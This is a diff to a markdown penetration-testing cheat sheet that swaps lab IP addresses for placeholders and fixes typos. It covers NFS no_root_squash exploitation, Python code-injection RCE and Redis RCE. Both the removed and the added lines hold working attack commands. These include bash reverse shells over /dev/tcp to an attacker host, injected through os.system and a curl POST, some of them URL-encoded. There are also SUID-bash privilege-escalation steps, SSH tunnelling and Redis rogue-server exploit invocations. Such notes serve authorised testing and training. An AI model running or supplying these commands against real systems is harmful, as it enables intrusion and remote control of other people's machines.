@@ -22,11 +22,11 @@
 - > "Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user."
 - Ports: 2049, 111
 - Show the NFS server’s export list: `showmount -e <target>`
-  - The same with nmap: `nmap –sV –script=nfs-showmount <target>`
+  - The same with nmap: `nmap -sV --script=nfs-showmount <target>`
 - Mount an NFS share: `mount -o rw,vers=2 <target>:<share> <local_directory>`
-  - `mount -t nfs [-o vers=2] 192.168.182.216:/srv/share /tmp/mount -o nolock`
-  - `sudo mount -t nfs 192.168.182.216:/share /tmp/mount`
-  - `mount -o rw,vers=2 192.168.182.216:/srv/share /tmp/mount`
+  - `mount -t nfs [-o vers=2] <TARGET_IP>:/srv/share /tmp/mount -o nolock`
+  - `sudo mount -t nfs <TARGET_IP>:/share /tmp/mount`
+  - `mount -o rw,vers=2 <TARGET_IP>:/srv/share /tmp/mount`
   - If the mount is restricted to localhost, try with an ssh tunnel or similar
 - See [Task 19 - Linux PrivEsc | TryHackMe](https://tryhackme.com/room/linuxprivesc)
 - One liner to extract credentials
@@ -37,20 +37,20 @@
 - `no_root_squash` turns root squashing off
 - example: `/srv/share  localhost(rw,sync,no_root_squash)`
   ```
-  showmount -e 192.168.182.216
-  sudo mount -t nfs 192.168.182.216:/share /tmp/mount
-  sudo mount -t nfs 192.168.182.216:/srv/share /tmp/mount -o nolock
-  mount -o rw,vers=2 192.168.182.216:/srv/share /tmp/mount
+  showmount -e <TARGET_IP>
+  sudo mount -t nfs <TARGET_IP>:/share /tmp/mount
+  sudo mount -t nfs <TARGET_IP>:/srv/share /tmp/mount -o nolock
+  mount -o rw,vers=2 <TARGET_IP>:/srv/share /tmp/mount
   ```
   1. VICTIM: `cp /bin/bash .`
   2. KALI: `sudo chown root:root bash; sudo chmod +xs bash`
   3. VICTIM: `./bash -p`
 - if you can't mount because restricted to localhost only and you have access to the victim's machine, try ssh tunneling:
   ```
-  ssh -N -L localhost:2049:localhost:2049 kali@192.168.45.195
-  ssh -N -L 127.0.0.1:8443:127.0.0.1:8443 kali@192.168.45.245
+  ssh -N -L localhost:2049:localhost:2049 <user>@<TARGET_IP>
+  ssh -N -L 127.0.0.1:8443:127.0.0.1:8443 <user>@<TARGET_IP>
   ```
-  - modify `/etc/hosts` with `echo "192.168.45.195 localhost" >> /etc/hosts`
+  - modify `/etc/hosts` with `echo "<TARGET_IP> localhost" >> /etc/hosts`
 - Check: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
 
 
@@ -90,11 +90,11 @@ If you have found a password
 ## Python
 
 - https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1
-- check if there is the library 'os', you can achieve RCE with `system('bash -i >& /dev/tcp/192.168.45.221/445 0>&1')`
+- check if there is the library 'os', you can achieve RCE with `system('bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1')`
 - alternatives
-  - `__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')#`
-  - `curl -X POST --data-urlencode 'code=__import__("os").system("bash -i >& /dev/tcp/192.168.49.195/445 0>&1")#' http://192.168.195.117:50000/verify`
-  - `code=__import__('os').system('bash+-i+>%26+/dev/tcp/192.168.49.195/445+0>%261')%2`
+  - `__import__('os').system('bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1')#`
+  - `curl -X POST --data-urlencode 'code=__import__("os").system("bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1")#' http://<TARGET_IP>:<PORT>/verify`
+  - `code=__import__('os').system('bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/<PORT>+0>%261')%2`
 
 
 ## Redis 6379
@@ -104,7 +104,7 @@ If you have found a password
   - try command `info`
   - if no login, run the command: `config get *`
 - To dump the db: `redis-utils` and `redis-dump`
-- Deafult config file: `/etc/redis/redis.conf`
+- Default config file: `/etc/redis/redis.conf`
 
 **SSRF**
 - eval "dofile('//myip/share')" 0
@@ -116,8 +116,8 @@ If you have found a password
   - if you don't need user:password, `python3 redis-rogue-server.py --rhost RHOST --lhost LHOST`
 - [RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)
 - other RCE (combine the two commands):
-  - python redis-rce.py -r 192.168.220.166 -L 192.168.45.181 -f exp.so -a 'Ready4Redis?'
-  - python3 redis-rogue-server.py --rhost 192.168.220.166 --rport 80 --lhost 192.168.45.181 --lport 7080 --exp=exp.so -v --passwd='Ready4Redis?'
+  - `python redis-rce.py -r <TARGET_IP> -L <ATTACKER_IP> -f exp.so -a '<PASSWORD>'`
+  - `python3 redis-rogue-server.py --rhost <TARGET_IP> --rport <PORT> --lhost <ATTACKER_IP> --lport <PORT> --exp=exp.so -v --passwd='<PASSWORD>'`
 
 **Resources**
 - [6379 - Pentesting Redis | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
